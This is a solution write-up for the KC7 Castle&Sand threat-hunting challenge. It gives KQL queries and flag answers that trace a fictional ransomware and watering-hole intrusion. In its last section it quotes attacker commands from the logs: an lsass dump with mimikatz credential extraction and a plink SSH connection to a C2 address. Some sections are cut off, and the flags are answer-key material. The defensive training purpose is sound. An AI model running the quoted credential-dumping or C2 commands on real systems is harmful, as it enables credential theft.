Skipped...

[Official Writeup](https://github.com/KC7-Foundation/kc7_data/blob/main/Castle%26Sand/castleandsand.com.md)

## Section 2: Shark Attack! 🦈

### 1: What email address did the threat actor provide to Castle&Sand to communicate with them? 

The picture gives us backstory of the attack, and the image includes attackers email at the bottom for proof of concept and communication.

[Ransomware Note](https://kc7photos.blob.core.windows.net/manualphotos/sharknado_ransom.png)

> Flag: `sharknadorules_gang@onionmail.org`
{: .prompt-tip }

### 2: What is the unique decryption ID?

Retrieved from the note.

> Flag: `SUNNYDAY123329JA0`
{: .prompt-tip }
 
### 3: Should this be something you post publicly about? Yes or no?

Publicly disclosing the ransomware is never a good idea, especially if this happens in company environment. The **sensitive** data which belong to organization cannot be disclosed to public, its your job as a SoC to protect that information from attackers.

> Flag: `No`
{: .prompt-tip }

### 4: How many notes appeared in Castle&Sand's environment?

_The ransom note filename was called "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt."_

```sql
FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname
| count 
```

> Flag: `774`
{: .prompt-tip }

### 5: How many distinct hostnames had the ransom note?

Same answer as in Question 4

> Flag: `774`
{: .prompt-tip }

### 6: How many distinct employee roles were affected by the ransomware attack?

**[let](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/let-statement)** operator.

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
Employees
| where hostname in (infectedHosts)
| distinct role
| count 
```

> Flag: `18`
{: .prompt-tip }

### 7: How many unique hostnames belong to IT employees?

From Question 6 we found the infected machine roles and only 1 role corresponds to IT.

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
Employees
| where hostname in (infectedHosts)
| where role == 'IT Helpdesk'
| count 
```

> Flag: `25`
{: .prompt-tip }

### 8: One of the IT employees has their IP address ending in 46. What's their name?

```sql
Employees
| where role == 'IT Helpdesk'
| where ip_addr endswith ".46"
```

> Flag: `Simeon Kakpovi`
{: .prompt-tip }

### 9: How many security alerts involved the different hosts?

In `SecurityAlerts` table there isnt distinct column for hostname. Description contains hostnames and [has_any](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/has-any-operator) operator can be used to check for multiple strings.

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (infectedHosts)
| count 
```

> Flag: `652`
{: .prompt-tip }

### 10: How about just the unique hostnames belonging to the IT Helpdesk from Question 7?

1. Filter for infected hosts
2. Filter for IT employee hostnames
3. Check security alerts for IT hostnames

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let infectedHostsIT = Employees
| where role == 'IT Helpdesk'
| where hostname in (infectedHosts)
| project hostname;
SecurityAlerts
| where description has_any (infectedHostsIT)
| count 
```

> Flag: `27`
{: .prompt-tip }

### 11: Who owns the machine that flagged on that alert? 

_(provide their name)_

Most description in the _previous query_ looks the same, but if we filter against `suspicious` we can identify the malicious file. 

```sql
| where not(description has 'A suspicious file was detected on host')
```

Find employee name.

```sql
Employees
| where hostname == '6S7W-MACHINE'
| project name
```

> Flag: `Preston Lane`
{: .prompt-tip }

### 12: When did the file appear on that user's machine? 

_copy and paste the full timestamp_

```sql
FileCreationEvents
| where hostname == '6S7W-MACHINE'
| where filename == 'Chomping-Schedule_Changes.xlsx'
```

> Flag: `2023-05-26T09:26:15Z`
{: .prompt-tip }

### 13: What's the SHA256 hash of that file?

Question 12 query, sha256.

> Flag: `71daa56c10f7833848a09cf8160ab5d79da2dd2477b6b3791675e6a8d1635016`
{: .prompt-tip }

### 14: What application created that file?

Question 12 query, `process_name`.

> Flag: `Firefox` or `firefox.exe`
{: .prompt-tip }

### 15: Let's look for other files with that same name. How many unique hosts had that file on their systems?

```sql
FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| distinct hostname
| count 
```

> Flag: `11`
{: .prompt-tip }

### 16: How many unique domains did employees download this file from?

```sql
OutboundNetworkEvents
| where url has 'Chomping-Schedule_Changes.xlsx'
| distinct url
```

```bash
https://jawfin.com/published/images/files/Chomping-Schedule_Changes.xlsx
http://sharkfin.com/modules/public/published/Chomping-Schedule_Changes.xlsx
```

> Flag: `2`
{: .prompt-tip }

### 17: Based on the employee we've been tracking from Question 11, which domain did they download the file from?

```sql
let employeeIP = Employees
| where hostname == '6S7W-MACHINE'
| project ip_addr;
OutboundNetworkEvents
| where src_ip == toscalar(employeeIP)
| where url has 'Chomping-Schedule_Changes.xlsx'
| project parse_url(url).Host
```

> Flag: `jawfin.com`
{: .prompt-tip }

### 18: How many unique IP addresses did the domain resolve to?

```sql
PassiveDns
| where domain == 'jawfin.com'
| distinct ip
| count  
``` 

> Flag: `6`
{: .prompt-tip }

### 19: Which IP address is closest to when the employee had the file created on their host machine?

1 IP appears 2 times within ~5days frame

```sql
let fileCreatedAt = toscalar(FileCreationEvents
| where hostname == '6S7W-MACHINE'
| where filename == 'Chomping-Schedule_Changes.xlsx'
| project timestamp);
PassiveDns
| where domain == 'jawfin.com'
| sort by timestamp 
| evaluate rows_near(timestamp >= fileCreatedAt, 1)
| extend fileCreatedAt
```

> Flag: `193.248.75.126`
{: .prompt-tip }

### 20: How many unique IPs did that domain resolve to?

_There was another domain found from Q16._

```sql
PassiveDns
| where domain == 'sharkfin.com'
| distinct ip
``` 

> Flag: `4`
{: .prompt-tip }

### 21: Let's take all of the IP addresses from the two domains and search them against network events on Castle&Sand's website. How many records returned from your query?

We can take known domains, get unique ips and filter `InboundNetworkEvents` for incoming requests from those ips. 

```sql
let susIPs = PassiveDns
| where domain in ('sharkfin.com', 'jawfin.com')
| distinct ip;
InboundNetworkEvents
| where src_ip in (susIPs)
| count 
```

> Flag: `39`
{: .prompt-tip }

### 22: When was the first time we saw any of these actor IP addresses from Q21 against Castle&Sand's network?

Replace Question 21 query `count` to `take 1` for first event. (Database is already sorted with timestamps)

> Flag: `2023-05-20T03:11:57Z`
{: .prompt-tip }

### 23: Let's search the actor IPs against AuthenticationEvents to see if they logged into any user machines or email accounts. How many records did you get back?

```sql
let susIPs = PassiveDns
| where domain in ('sharkfin.com', 'jawfin.com')
| distinct ip;
AuthenticationEvents
| where src_ip in (susIPs)
```

> Flag: `0`
{: .prompt-tip }

### 24: Let's look for the malicious domains in Emails. How many records did you get back?

```sql
Email
| where parse_url(link).Host in ('sharkfin.com', 'jawfin.com')
| count 
```

> Flag: `14`
{: .prompt-tip }

### 25: When was the earliest email sent?

Replace Question 24 query `count` to `take 1` for first event. (Database is already sorted with timestamps)

> Flag: `2023-05-25T16:33:09Z`
{: .prompt-tip }

### 26: Who was the sender?

Question 25 has the answer.

> Flag: `legal.sand@verizon.com`
{: .prompt-tip }

### 27: How many emails total did that sender send to Castle&Sand employees?

```sql
Email
| where sender == 'legal.sand@verizon.com'
| where recipient endswith 'castleandsand.com'
| count 
```

> Flag: `23`
{: .prompt-tip }

### 28: Take all of the distinct sender or reply_to emails from the last question. How many emails total are associated with these email addresses?

We already know `sender` and we can use same query to get `distinct reply_to`

```sql
let maliciousSender = 'legal.sand@verizon.com';
Email
| where sender == maliciousSender
| where recipient endswith 'castleandsand.com'
| distinct reply_to 
```

I wasn't able to figure out a graceful way to join 2 columns into 1, so I just created list variable using [dynamic](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/scalar-data-types/dynamic) data type.

Using `or` 

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
Email
| where sender in (emails) or reply_to in (emails)
| count 
```

> Flag: `40`
{: .prompt-tip }

### 29: How many unique domains did the email addresses use in their emails?

Same query from Question 28, but instead of 
```sql
| count
```
--->
```sql
| distinct tostring(parse_url(link).Host)
```

> Flag: `6`
{: .prompt-tip }

### 30: How many distinct IP addresses total were used by all of the domains identified in Q28?

Question should mention Q29? 🤔

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
let domains = Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_url(link).Host);
PassiveDns
| where domain in (domains)
| distinct ip
| count 
```

> Flag: `15`
{: .prompt-tip }

### 31: How many user accounts did these IPs log into?

The sql is getting longer and longer, we just need to check previous query results IPs in `AuthenticationEvents` for login attempts.

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
let domains = Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_url(link).Host);
let ips = PassiveDns
| where domain in (domains)
| distinct ip;
AuthenticationEvents
| where src_ip in (ips)
```

> Flag: `0`
{: .prompt-tip }

### 32: Looking at these emails (from question 31), how many unique filenames were served by these domains?

Question should mention Q28 for emails? 🤔

[parse_path](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-path-function) function is useful in this case for extracting the filenames.

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_path(link).Filename)
```
 
> Flag: `5`
{: .prompt-tip }

### 33: How many files with these names were created on employee host machines?

Extend query from Question32 and get distinct machine hostnames.

```sql
FileCreationEvents
| where filename in (Q32Output)
| distinct hostname
| count 
```

> Flag: `34`
{: .prompt-tip }

### 34: When was the first file observed?

For some reason the database wasn't sorted so add that condition.

```sql
FileCreationEvents
| where filename in (Q32Output)
| order by timestamp asc 
| take 1
```

> Flag: `2023-05-25T16:43:20Z`
{: .prompt-tip }

### 35: How many records total are associated with the identified host machines from Q33?

The sql chain getting longer and longer...

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
let Q32Output = Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_path(link).Filename);
let Q33Output = FileCreationEvents
| where filename in (Q32Output)
| distinct hostname;
ProcessEvents
| where hostname in (Q33Output)
| count 
```

> Flag: `16391`
{: .prompt-tip }

### 36: How many records total do you have now?

_Using your query from Q35, set a new query where the timestamp is greater than the first time you saw the file in Q34._

We can add one more filter

```sql
| where timestamp > datetime(2023-05-25T16:43:20Z)
```

> Flag: `5818`
{: .prompt-tip }

### 37: What IP address is referenced in that command?

_Let's look at the first few records. There's some suspicious powershell activity that occurs near the beginning._

We can filter `process_commandline` for only `powershell` commands and we can also filter against commands that start with `C:` (absolute path), because users usually run commands with relative path.

```sql
ProcessEvents
| where hostname in (Q33Output)
| where timestamp >= datetime(2023-05-25T16:43:20Z)
| where process_commandline has 'powershell'
| where not(process_commandline has 'C:')
| order by timestamp asc
| project process_commandline
```

Weird thing happened in this query, `project process_commandline` decided that it would sort the results on its own? that's why `order by` is necessary with `project` in this query..

> Flag: `220.35.180.137`
{: .prompt-tip }

### 38: Which host machine did the powershell activity execute on?

We found it from Question 37 query (first event). 

> Flag: `CL8Q-LAPTOP`
{: .prompt-tip }

### 39: There's a weird repeating command right before this activity. What's the parent process of the first time this repeated activity occurs?

Filter for events till the previous query's answer and then count parent process names.

```sql
ProcessEvents
| where hostname == 'CL8Q-LAPTOP'
| where timestamp <= datetime('2023-05-25T18:28:02Z')
| summarize count() by parent_process_name
```

The results look normal? All listed processes seem legit, but **[scvhost.exe](https://www.wikiwand.com/en/Svchost.exe)** seems a bit weird. <br>
First of all if you're windows user you probably checked `Task Manager > Details` tab and would have seen bijilion of this programs running for whatever reason... and if we take a closer look we can notice that it's _s**cv**host_ not _s**vc**host_. Sussy indeed 👀

> Flag: `scvhost.exe`
{: .prompt-tip }

### 40: What legitimate Windows process was this file trying to masquerade as?

Discussed in Question 39

> Flag: `svchost.exe`
{: .prompt-tip }

### 41: How many hosts had their passwords dumped?

The most popular tool for dumping password on Windows machine is, of course without saying, **[mimikatz](https://github.com/ParrotSec/mimikatz)**. 

We can filter for common keyword to identify the process if we are not 100% certain.

```sql
ProcessEvents
| where hostname == 'CL8Q-LAPTOP'
| where process_commandline contains 'password'
```

```sql
ProcessEvents
| where process_name == 'mimikatz.exe'
| distinct hostname
| count 
```

> If you tried `process_commandline has 'mimikatz'` then you would have noticed extra 4 events, which for this question is not revelant.

> Flag: `31`
{: .prompt-tip }

### 42: How many hosts did that powershell command execute on?

_Let's go back to the powershell activity Q37._

From Question 37 we saw PowerShell command is downloading a script from the specified URL and executing it in a hidden mode without loading the user profile.

```sql
ProcessEvents
| where process_commandline has '.downloadstring'
| distinct hostname
| count 
```

> Flag: `31`
{: .prompt-tip }

### 43: How many unique IP addresses were used in these commands?

To get unique IPs first we have to extract them from `process_commandline`. The proccess is very simple using [RegEx](https://www.wikiwand.com/en/Regular_expression).<br>
**[extract](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/extract-function)** function allows us to specify the 1) pattern, 2) group to select, 3) from where.

If RegEx pattern seems scary, just know that it's simple IP matcher, `[0-9]+.` -> `123.` repeated 3 times + `[0-9]` -> 123.<br>
I wont dive into [regular expressions](https://media.dev.to/cdn-cgi/image/width=1080,height=1080,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fi%2F3umga1qn8k7lwrr1ltw8.png), but its very powerful tool to know.

```sql
ProcessEvents
| where process_commandline has '.downloadstring'
| distinct attackerIP = extract('(([0-9]+.){3}[0-9]+)', 1, process_commandline)
| count 
```

> Flag: `14`
{: .prompt-tip }

### 44: Which of these IP addresses was seen the most?

Almost same query, but with **[count](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/count-aggregation-function)** function.<br>
To make it easier to identify the most repeated IP we can utilize **[sort/order by](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/sort-operator)** function

```sql
ProcessEvents
| where process_commandline has '.downloadstring'
| project attackerIP = extract('(([0-9]+.){3}[0-9]+)', 1, process_commandline)
| summarize count() by attackerIP
| order by count_ desc
```

> KQL automatically names columns and for count it's `count_`

> Flag: `157.242.169.232`
{: .prompt-tip }

### 45:  How many records total involved those processes?

_Take the parent processes from Q42._

```sql
let Q42ParentProcessHashes = ProcessEvents
| where process_commandline has '.downloadstring'
| distinct parent_process_hash;
ProcessEvents
| where parent_process_hash in (Q42ParentProcessHashes)
| count 
```

> Flag: `62`
{: .prompt-tip }

### 46: Let's look to see if any of these files are referenced in the command line. How many records did you find?

`these files` means the `parent_process_names` from Question 42.

```sql
let files = ProcessEvents
| where process_commandline has '.downloadstring'
| distinct parent_process_name;
ProcessEvents
| where process_commandline has_any (files)
| count 
```

> Flag: `1548`
{: .prompt-tip }

### 47: When was the earliest time found in Q46?

`| count` -> `| take 1 | project timestamp` from Question 47.

> Flag: `2023-06-09T19:43:58Z`
{: .prompt-tip }

### 48: When was the earliest time you saw these files?

_You remember that the encrypted files all had the extension '.sharkfin'. Search for that in created files._

```sql
FileCreationEvents
| where filename endswith ".sharkfin"
| order by timestamp asc 
| take 1
```

> Flag: `2023-06-09T19:43:48Z`

## Section 3: Hunting the Shark 🔍

### 1: How many hours does Castle&Sand have before the gang releases the information? 

_Link to voicemail: <https://twitter.com/webyteyourdata/status/1665825830495219713>_

> Flag: `72`
{: .prompt-tip }

### 2: What do the ransomware gang call themselves?

The answer is in Voice mail (~10 seconds) or #tag.

> Flag: `Shark boys`
{: .prompt-tip }

### 3: What Mitre Technique is aligned with what this group did on Castle&Sand systems?

**[T1486](https://attack.mitre.org/techniques/T1486/)**: Data Encrypted for Impact.

> _Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key._

> Flag: `T1486`
{: .prompt-tip }

### 4: Let's search for the email domain used in the ransom note. What is the ZIP code of their headquarters?

Some **[OSINT](https://www.imperva.com/learn/application-security/open-source-intelligence-osint/)** required for this task. First let's go back some:<br>
Flashback To Section 2 Question 1: _[Ransomeware Note](https://kc7photos.blob.core.windows.net/manualphotos/sharknado_ransom.png)_

We find the domain of the email the attackers used in the Ransom Note. After that we can go to the official website and search for the answer.<br>
For address we can refer to **Privacy Policy** page and then **Contacting us** header.

> Flag: `10016`
{: .prompt-tip }

### 5: What country is this email service located in?

We learned it from Question 4.

> Flag: `USA`
{: .prompt-tip }

### 6: How many continents total are these IP addresses from?

* Let's look at the IP addresses from Section 2, Q18 using MaxMind GeoIP2. 
* You can use a service like MaxMind GeoIP here: <https://www.maxmind.com/en/geoip-demo>

> _**GeoIP**_ is a technique allowing to locate a web user based on their IP address.

```sql
PassiveDns
| where domain == 'jawfin.com'
| distinct ip
```

We can use given website to do GeoIP lookup for found (6) IPs, filter for **distinct continents** for answer.

> If you have AdBlocker enabled the service may not work

> Flag: `3`
{: .prompt-tip }

### 7: What is the Autonomous System (AS) number for the IP address?

_Use <https://search.censys.io> to look up the IP address found in Section 2, Q19._

```sql
193.248.75.126
```

**[ASN](https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/)** stands for Autonomous System Number. Imagine the internet as a giant network of highways. ASNs are like IDs for different highway authorities, each managing their own section. An AS can be an internet service provider (ISP), a large company, or even a government agency.

These authorities (ASNs) decide how traffic flows within their networks and how to connect to other highways (ASNs). This keeps the internet running smoothly and efficiently. There's a central registry to avoid confusion, ensuring each highway authority (ASN) has a unique ID.

-- For answer just submit the IP (from Section 2, Question 19) to given website

> Flag: `AS3215`
{: .prompt-tip }

### 8: Which one is assigned to a University?

_Look at the IPs from Section 2, Q20._

```sql
PassiveDns
| where domain == 'sharkfin.com'
| distinct ip
```

We can utilize **[MaxMind GeoIP](https://www.maxmind.com/en/geoip-demo)** again to identify source of ips, only 1 IP belong to University.

> Flag: `157.242.169.232`
{: .prompt-tip }

### 9: Which email address is associated with a company outside of the United States?

_Look at the emails from Section 2, Q28._

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
```

If you already don't know this company, you can look each one to learn more about them.

> Flag: `urgent_urgent@yandex.com`
{: .prompt-tip }

### 10: For the tool found in Section 2, Q41, What is the MITRE ID for that specific software?

[Mimikatz, Software S0002](https://attack.mitre.org/software/S0002/)

> Flag: `S0002`
{: .prompt-tip }

### 11: For the tool found in Section 2, Q41, what is the MITRE ID for that that type of technique that this tool is typically used for?

We know that attackers used this program to dump credentials of users, so we can lookup `Techniques Used` table for ID referencing this attack's **ID**.

> Flag: `T1003`
{: .prompt-tip }

### 12: How many unique SHA256 hashes are found in Castle&Sand's environment with these filenames?

_Take the filenames from Section 2, Q45._

```sql
let Q42ParentProcessHashes = ProcessEvents
| where process_commandline has '.downloadstring'
| distinct parent_process_hash;
let Q45ProcessNames = ProcessEvents
| where parent_process_hash in (Q42ParentProcessHashes)
| distinct parent_process_name; // From Q45
FileCreationEvents              // New Lines For Query
| where filename in (Q45ProcessNames)
| distinct sha256
| count 
```

> Flag: `9`
{: .prompt-tip }

### 13: How many were flagged as malicious on VirusTotal?

I didn't want to go through the VirusTotal 1 by 1, so I just wrote a small script to grab relevant data.

[**VirusTotal**: API Docs](https://docs.virustotal.com/reference/overview): [File Info](https://docs.virustotal.com/reference/file-info)

```python

### 15: What ransomware family uses a command similar to this process execution?

_For Section 2, Q46_

We learned about this from Question 13/14 (has more then 1 name).

> Flag: `Bablock` or `Rorschach`
{: .prompt-tip }

## Section 4: Sand in my 👁️👁️ (New Threat Actor)

### 1: How many emails were sent from this email to Castle&Sand employees?
 
```sql
let email = 'castleandsand_official@outlook.com'; // Given from question
Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct recipient
| count  
```

> Flag: `19`
{: .prompt-tip }

### 2: There appears to be another email account. How many emails total are referenced by these two email accounts?

We also have a `reply_to` in emails, filtering for distinct emails we get 2. After that we can filter for communication for those emails.

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
Email
| where sender in (replyToEmails)
| count 
```

> Flag: `33`

### 3: How many unique domains were used by these email accounts?

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
Email
| where sender in (replyToEmails)
| distinct tostring(parse_url(link).Host)
```

> Flag: `4`
{: .prompt-tip }

### 4: Based on these domains, what type of attack did this threat actor conduct?

First let's observe what happened.<br>
If we filter `OutboundNetworkEvents` for known domains we see a weird behavior, the domains are mainly in `http://link?redirect=domain`. Similar behavior was observed in `Balloons Over Iowa` room.<br>

```sql
let domains = dynamic([
    'keywordssurfparadise.com',
    'beachlifestylestore.com',
    'sunandcastletrading.com',
    'sandsurfinggear.com'
]);
OutboundNetworkEvents
| where url has_any (domains)
```

Now let's see what happens after redirect. <br>
Redirections seem to be initiated from legitimate websites and ends up on malicious domain with file download. This attack is known as **[Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)** or **Watering Hole Attack**.

```sql
let domains = dynamic([
    'keywordssurfparadise.com',
    'beachlifestylestore.com',
    'sunandcastletrading.com',
    'sandsurfinggear.com'
]);
OutboundNetworkEvents
| where url has_any (domains)
| serialize 
| evaluate rows_near(url has '?redirect', 1, 0)
```

> Flag: `watering hole`
{: .prompt-tip }

### 5: How many distinct job roles were targeted by this type of attack?

Continuing the query from Question 3.

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
let affectedEmails = Email
| where sender in (replyToEmails)
| distinct recipient;
Employees
| where email_addr in (affectedEmails)
| distinct role
| count 
```

> Flag: `13`
{: .prompt-tip }

### 6: How many external IP addresses were used to successfully log into those user accounts?

_Let's take the targeted employees and look for all external IP addresses that authenticated to those users._

Chain the previous query with current one and filter `AuthenticationEvents` for login events.
1. Get affected employee usernames
2. Filter out local ips (which belong to employees)
3. Only get effected employees.
4. Get successful logins
5. Get distict remote IPs

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
let affectedEmails = Email
| where sender in (replyToEmails)
| distinct recipient;
let affectedEmployees = Employees
| where email_addr in (affectedEmails)
| distinct username; // 1.
AuthenticationEvents
| where not( src_ip in (Employees | distinct ip_addr) ) // 2.
| where username in (affectedEmployees) // 3.
| where result == 'Successful Login' // 4.
| distinct src_ip // 5.
| count 
```

> Flag: `43`
{: .prompt-tip }

### 7: These IP addresses may have accessed email inboxes and downloaded data. How many unique filenames were downloaded by these IP addresses?

We need to look inside `InboundNetworkEvents` table, because the attackers got inside the machines and probably downloaded the malicious files.

If you take a look at `url` column accessed by IPs, you will notice urls with `download` keyword.

**[parse_urlquery](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-url-query-function)** function can be used to parse the query string in url. Parse the (json) output of function and get distinct filenames. (`tostring` required for `distinct`) 

```sql
InboundNetworkEvents
| where src_ip in (Q6Output)
| where url has 'download'
| distinct tostring(parse_urlquery(url)['Query Parameters']['output'])
| count 
```

> Flag: `14`
{: .prompt-tip }

### 8: How many distinct IPs were involved in the stealing of downloaded data from the previous questions?

```sql
InboundNetworkEvents
| where src_ip in (Q6Output)
| where url has 'download'
| distinct src_ip
| count 
```

> Flag: `9`
{: .prompt-tip }

### 9: Based on the IPs from Q6, how many unique domains did they resolve to?

For domains we need to use `PassiveDns` table.

```sql
PassiveDns
| where ip in (Q6Output)
| distinct domain
| count 
```

> Flag: `5`
{: .prompt-tip }

### 10: Let's go back to the user accounts that may have been affected by the phishing campaign. How many hosts have they logged into?

Modify Question 6 query.

Since the attackers got inside machines we cant rule out the possibility of them using company's network to pivot to other machines.

```sql
AuthenticationEvents
| where username in (affectedEmployees)
| where result == 'Successful Login'
| distinct hostname
| count 
```

> Flag: `43`
{: .prompt-tip }

### 11: Investigate the domains from Q9. How many files are present on Castle&Sand systems that originated from these domains?

First filter for _watering hole_ domains in `OutboundNetworkEvents`. <br>
Not all urls resolved to download, so I used **[parse_path](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-path-function)** function to extract Extension, filter empty Extension and then grab Filenames.<br>
After getting filenames we check `FileCreationEvents` for relevant files.

```sql
let requestedFilenames = OutboundNetworkEvents
| where url has_any (Q9Output)
| extend extension = parse_path(url).Extension
| where extension != ''
| distinct tostring(parse_path(url).Filename);
FileCreationEvents
| where filename in (requestedFilenames)
| count 
```

> Checking extension doesn't really matter for this case, because filenames will match themselves and extensionless files will get ignored. But cleaner data is always nice.

> Flag: `15`

### 12: Investigate what happens after these files are downloaded and find malicious activity. How many unique malware filenames are created from these files?

1. Get malicious filenames
2. Get downloaded filenames
3. Get hostnames where files got downloaded
4. Filter `FileCreationEvents`
    1. By hostname
    2. Add new column using [next](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/next-function) function to get next row value in current row. [Practical Demonstation By TechBrothersIT](https://www.techbrothersit.com/2022/04/next-function-in-kusto-query-kusto.html)
    3. By malicious filenames
    4. Get next_filenames
    5. But not same filenames in 3

```sql
let requestedFilenames = OutboundNetworkEvents
| where url has_any (Q9Output)
| distinct tostring(parse_path(url).Filename);
let downloadedFiles = FileCreationEvents
| where filename in (requestedFilenames)
| distinct filename;
let downloadedFilesHosts = FileCreationEvents
| where filename in (requestedFilenames)
| distinct hostname;
FileCreationEvents
| where hostname in (downloadedFilesHosts)
| order by timestamp asc
| extend next_filename = next(filename, 1)
| where filename in (downloadedFiles)
| distinct next_filename  
| where not(next_filename in (downloadedFiles))

### 14: How many distinct C2 servers are associated with the malware?

Since we are looking for C2 Servers we need to look for IPv4 addresses. First we filter processes by parent process name (malicious file) and then I used regex to filter for IPv4 in process_commandline. [extract](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/extract-function) function to get regex pattern from column.

```sql
let maliciousFiles = dynamic([
    'TSVIPSrv.dll',
    '1.exe',
    'i.exe',
    'wmi.dll',    
    'procdump64.exe'
]);
let patternIP = @"((\d{1,3}\.){3}\d{1,3})";
ProcessEvents
| where parent_process_name in (maliciousFiles)
| where process_commandline matches regex patternIP
| project c2server = extract(patternIP, 0, process_commandline)
| distinct c2server
| count 
```

> Flag: `7`
{: .prompt-tip }

### 15:  When is the first time you see this final action by the threat actor? Copy & paste the full timestamp.

_KC7: Now it's kind of a choose your own adventure. You need to find out what this threat actor did at the very end._

First let's start by getting all the records which are associated with malicious files.

```sql
let maliciousFiles = dynamic([
    'TSVIPSrv.dll',
    '1.exe',
    'i.exe',
    'wmi.dll',    
    'procdump64.exe'
]);
ProcessEvents
| where parent_process_name in (maliciousFiles)
| project timestamp, username, process_name, parent_process_name, process_commandline
```

Commands look mostly the same. The last effected user is `jojones`.<br>
2 commands was run on this user: 

I. `procdump64.exe -accepteula -ma lsass.exe lsass.dmp C:\mi.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit >> C:\log.txt mimikatz's sekurlsa::logonpasswords`
1. **Procdump (`procdump64.exe`):**
    - `procdump64.exe`: This is a command-line utility provided by Sysinternals (Microsoft) used for creating process dumps of running applications.
    - `-accepteula`: This flag is used to automatically accept the End-User License Agreement (EULA) when running Procdump.
    - `-ma`: This flag specifies that Procdump should create a full dump of the target process memory.
    - `lsass.exe`: This is the target process for which the memory dump is being created. `lsass.exe` is the Local Security Authority Subsystem Service on Windows.
    - `lsass.dmp`: This is the output file where the memory dump of the `lsass.exe` process will be saved.
2. **Mimikatz (`mimikatz.exe`):**
    - `C:\mi.exe`: This seems to be an executable file named "mi.exe" (or possibly "mimikatz.exe") located in the root of the C: drive.
    - `"privilege::debug"`: This is a command passed to Mimikatz. It grants the debug privilege to the process running Mimikatz. Debug privilege is necessary for certain operations, especially those interacting with LSASS (Local Security Authority Subsystem Service).
    - `"sekurlsa::logonpasswords full"`: This is another Mimikatz command. It instructs Mimikatz to perform a specific action - in this case, extracting logon passwords from LSASS (~dump credentials).
    - `exit`: This command is used to exit Mimikatz after the specified commands have been executed.
    - `>> C:\log.txt`: This redirects the standard output of Mimikatz to a file named "log.txt" in the root of the C: drive.

In summary, this command sequence uses Procdump to create a memory dump of the LSASS process and then uses Mimikatz to analyze that dump the credentials.

II. `plink.exe -i C:\Users\admin\.ssh\id_rsa 198.161.105.253 -q`
- `plink.exe`: This is the executable for Plink, a command-line SSH client for Windows.
- `-i C:\Users\admin\.ssh\id_rsa`: This flag specifies the private key file to be used for authentication. In this case, the private key is located at `C:\Users\admin\.ssh\id_rsa`.
- `198.161.105.253`: This is the IP address of the remote server to which you want to connect via SSH.
- `-q`: This flag stands for "quiet" and is used to suppress informational messages during the connection, making the output less verbose.

In summary, the command is initiating an SSH connection to the C2 server using the private key located at `C:\Users\admin\.ssh\id_rsa`, and suppressing additional informational messages with the `-q` flag. This is often used in automation scripts or scenarios where a quiet and automated connection is desired.

Now let's see what happens after `plink` was executed on `jojones` computer and filter for cmd/powershell for shell commands.

```sql
ProcessEvents
| where username == 'jojones'
| where timestamp > datetime('2023-05-17T09:20:15Z')
| where process_name in ('powershell.exe', 'cmd.exe')
```

Attacker seems to have enumerated the system with first commands and finally they used **[Invoke-DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator/tree/master)**: <br>
_DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel._

